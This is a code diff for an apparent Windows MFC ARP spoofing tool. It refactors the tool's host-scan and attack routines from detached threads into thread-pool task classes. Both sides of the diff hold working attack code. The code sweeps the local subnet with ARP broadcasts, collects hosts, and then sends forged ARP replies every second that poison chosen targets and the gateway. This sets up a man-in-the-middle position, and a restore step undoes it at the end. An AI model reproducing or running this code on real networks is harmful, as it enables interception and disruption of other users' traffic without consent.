@@ -143,7 +143,8 @@ void CARPTestDlg::OnDestroy()
 
 	g_attacking = FALSE;
 	g_programRunning = FALSE;
-	Sleep(3000); // wait for threads to end
+	//Sleep(3000); // wait for threads to end
+	g_threadPool.StopThreads();
 	pcap_freealldevs(g_deviceList);
 }
 
@@ -202,87 +203,95 @@ void CARPTestDlg::OnBnClickedButton2()
 	m_deviceDescList.EnableWindow(FALSE);
 	m_confirmButton.EnableWindow(FALSE);
 	SetTimer(0, 3000, NULL);
-
-	auto ScanHostThread = [this]
+	
+	/*std::thread thread(ScanHostThread);
+	thread.detach();*/
+	class ScanHostTask : public Task
 	{
-		AdapterHandle adapter(GetAdapterHandle());
-		if (adapter == nullptr)
-			return;
-
-		ARPPacket packet(TRUE);
-		memset(&packet.destinationMac, 0xFF, sizeof(packet.destinationMac)); // broadcast
-		packet.SetSender(g_selfIp, g_selfMac);
-
-		// get IP range
-		DWORD rSelfIp = ntohl(g_selfIp);
-		DWORD startIp = rSelfIp & 0xFFFFFF00 | 0x01;
-		DWORD stopIp = rSelfIp & 0xFFFFFF00 | 0xFE;
-
-		// scan
-		packet.targetIp = g_selfGateway;
-		pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-		Sleep(10);
-		for (DWORD ip = startIp; ip <= stopIp; ip++)
+	private:
+		CARPTestDlg* dlg;
+	public:
+		ScanHostTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
+		void Run()
 		{
-			DWORD rIp = htonl(ip);
-			if (rIp != g_selfIp && rIp != g_selfGateway)
+			AdapterHandle adapter(GetAdapterHandle());
+			if (adapter == nullptr)
+				return;
+
+			ARPPacket packet(TRUE);
+			memset(&packet.destinationMac, 0xFF, sizeof(packet.destinationMac)); // broadcast
+			packet.SetSender(g_selfIp, g_selfMac);
+
+			// get IP range
+			DWORD rSelfIp = ntohl(g_selfIp);
+			DWORD startIp = rSelfIp & 0xFFFFFF00 | 0x01;
+			DWORD stopIp = rSelfIp & 0xFFFFFF00 | 0xFE;
+
+			// scan
+			packet.targetIp = g_selfGateway;
+			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+			Sleep(10);
+			for (DWORD ip = startIp; ip <= stopIp; ip++)
 			{
-				packet.targetIp = rIp;
-				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-				Sleep(10);
+				DWORD rIp = htonl(ip);
+				if (rIp != g_selfIp && rIp != g_selfGateway)
+				{
+					packet.targetIp = rIp;
+					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+					Sleep(10);
+				}
 			}
-		}
 
-		// get reply
-		SetFilter(adapter.get(), "ether proto arp");
-		pcap_pkthdr* header;
-		const BYTE* pkt_data;
-		int res;
-		while (g_programRunning && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
-		{
-			if (res == 0) // timeout
-				continue;
-			const ARPPacket* pak = (const ARPPacket*)pkt_data;
-			if (pak->type != PROTOCOL_ARP
-				|| (pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST)
-				|| pak->senderIp == 0) // not ARP
-				continue;
-			g_hostAttackListLock.lock();
-			if (g_host.find(pak->senderIp) != g_host.end()) // not in g_host
+			// get reply
+			SetFilter(adapter.get(), "ether proto arp");
+			pcap_pkthdr* header;
+			const BYTE* pkt_data;
+			int res;
+			while (g_programRunning && (res = pcap_next_ex(adapter.get(), &header, &pkt_data)) >= 0)
 			{
+				if (res == 0) // timeout
+					continue;
+				const ARPPacket* pak = (const ARPPacket*)pkt_data;
+				if (pak->type != PROTOCOL_ARP
+					|| (pak->opcode != ARP_OPCODE_REPLY && pak->opcode != ARP_OPCODE_REQUEST)
+					|| pak->senderIp == 0) // not ARP
+					continue;
+				g_hostAttackListLock.lock();
+				if (g_host.find(pak->senderIp) != g_host.end()) // in g_host
+				{
+					g_hostAttackListLock.unlock();
+					continue;
+				}
 				g_hostAttackListLock.unlock();
-				continue;
-			}
-			g_hostAttackListLock.unlock();
 
-			// add to list
-			if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
-			{
-				int index = m_hostList.GetItemCount();
-				m_hostList.InsertItem(index, "");
-				BYTE* bIp = (BYTE*)&pak->senderIp;
-				CString tmp;
-				tmp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
-				m_hostList.SetItemText(index, 1, tmp);
-				m_hostList.SetItemText(index, 2, (CString)pak->senderMac);
-				m_hostList.SetItemText(index, 3, "¡ü¡ý");
-				m_hostList.SetItemText(index, 4, "true");
-				m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
-			}
-			// add to g_host
-			g_hostAttackListLock.lock();
-			HostInfoSetting& host = g_host[pak->senderIp];
-			g_hostAttackListLock.unlock();
-			host.ip = pak->senderIp;
-			host.mac = pak->senderMac;
+				// add to list
+				if (pak->senderIp != g_selfIp && pak->senderIp != g_selfGateway)
+				{
+					int index = dlg->m_hostList.GetItemCount();
+					dlg->m_hostList.InsertItem(index, "");
+					BYTE* bIp = (BYTE*)&pak->senderIp;
+					CString tmp;
+					tmp.Format("%u.%u.%u.%u", bIp[0], bIp[1], bIp[2], bIp[3]);
+					dlg->m_hostList.SetItemText(index, 1, tmp);
+					dlg->m_hostList.SetItemText(index, 2, (CString)pak->senderMac);
+					dlg->m_hostList.SetItemText(index, 3, "¡ü¡ý");
+					dlg->m_hostList.SetItemText(index, 4, "true");
+					dlg->m_hostList.SetItemData(index, (DWORD_PTR)pak->senderIp);
+				}
+				// add to g_host
+				g_hostAttackListLock.lock();
+				HostInfoSetting& host = g_host[pak->senderIp];
+				g_hostAttackListLock.unlock();
+				host.ip = pak->senderIp;
+				host.mac = pak->senderMac;
 
-			if (pak->senderIp == g_selfGateway)
-				g_gatewayMac = pak->senderMac;
+				if (pak->senderIp == g_selfGateway)
+					g_gatewayMac = pak->senderMac;
+			}
+			TRACE("scan end\n");
 		}
 	};
-
-	std::thread thread(ScanHostThread);
-	thread.detach();
+	g_threadPool.AddTask(std::unique_ptr<ScanHostTask>(new ScanHostTask(this)));
 }
 
 #pragma region UI
@@ -475,68 +484,79 @@ void CARPTestDlg::OnBnClickedButton1()
 	g_attacking = TRUE;
 	m_attackButton.EnableWindow(FALSE);
 
-	auto AttackThread = [this]
+	/*std::thread thread(AttackThread);
+	thread.detach();*/
+	class AttackTask : public Task
 	{
-		AdapterHandle adapter(GetAdapterHandle());
-		if (adapter == nullptr)
-			return;
-
-		m_attackButton.SetWindowText("stop");
-		m_attackButton.EnableWindow(TRUE);
-		// start capture
-		std::thread packetHandleThread(PacketHandleThread);
-
-		ARPPacket packet(FALSE);
-		packet.SetSender(0, g_selfMac);
-		// send
-		while (g_attacking)
+	private:
+		CARPTestDlg* dlg;
+	public:
+		AttackTask(CARPTestDlg* _dlg) : dlg(_dlg) {};
+		void Run()
 		{
-			DWORD time = GetTickCount();
+			AdapterHandle adapter(GetAdapterHandle());
+			if (adapter == nullptr)
+				return;
+
+			dlg->m_attackButton.SetWindowText("stop");
+			dlg->m_attackButton.EnableWindow(TRUE);
+			// start capture
+			std::thread packetHandleThread(PacketHandleThread);
+
+			ARPPacket packet(FALSE);
+			packet.SetSender(0, g_selfMac);
+			// send
+			while (g_attacking)
+			{
+				DWORD time = GetTickCount();
+				g_hostAttackListLock.lock();
+				for (const auto& i : g_attackList)
+				{
+					if (i.second->cheatTarget) // send to target
+					{
+						packet.SetTarget(i.first, i.second->mac);
+						packet.senderIp = g_selfGateway;
+						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+					}
+					if (i.second->cheatGateway) // send to gateway
+					{
+						packet.SetTarget(g_selfGateway, g_gatewayMac);
+						packet.senderIp = i.first;
+						pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+					}
+				}
+				g_hostAttackListLock.unlock();
+				Sleep(1000 - (GetTickCount() - time));
+			}
+
+			//////////////////////////////////////////////////////////////////////////////
+			// stop attacking
+
+			packetHandleThread.join();
+
+			// recover
 			g_hostAttackListLock.lock();
 			for (const auto& i : g_attackList)
 			{
-				if (i.second->cheatTarget) // send to target
-				{
-					packet.SetTarget(i.first, i.second->mac);
-					packet.senderIp = g_selfGateway;
-					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-				}
-				if (i.second->cheatGateway) // send to gateway
-				{
-					packet.SetTarget(g_selfGateway, g_gatewayMac);
-					packet.senderIp = i.first;
-					pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-				}
+				// send to target
+				packet.SetSender(g_selfGateway, g_gatewayMac);
+				packet.SetTarget(i.first, i.second->mac);
+				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
+				// send to gateway
+				packet.SetSender(i.first, i.second->mac);
+				packet.SetTarget(g_selfGateway, g_gatewayMac);
+				pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
 			}
 			g_hostAttackListLock.unlock();
-			Sleep(1000 - (GetTickCount() - time));
+
+			// end
+			if (g_programRunning)
+			{
+				dlg->m_attackButton.SetWindowText("start");
+				dlg->m_attackButton.EnableWindow(TRUE);
+			}
+			TRACE("attack end\n");
 		}
-
-		//////////////////////////////////////////////////////////////////////////////
-		// stop attacking
-
-		packetHandleThread.join();
-
-		// recover
-		g_hostAttackListLock.lock();
-		for (const auto& i : g_attackList)
-		{
-			// send to target
-			packet.SetSender(g_selfGateway, g_gatewayMac);
-			packet.SetTarget(i.first, i.second->mac);
-			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-			// send to gateway
-			packet.SetSender(i.first, i.second->mac);
-			packet.SetTarget(g_selfGateway, g_gatewayMac);
-			pcap_sendpacket(adapter.get(), (u_char*)&packet, sizeof(packet));
-		}
-		g_hostAttackListLock.unlock();
-
-		// end
-		m_attackButton.SetWindowText("start");
-		m_attackButton.EnableWindow(TRUE);
 	};
-
-	std::thread thread(AttackThread);
-	thread.detach();
+	g_threadPool.AddTask(std::unique_ptr<AttackTask>(new AttackTask(this)));
 }
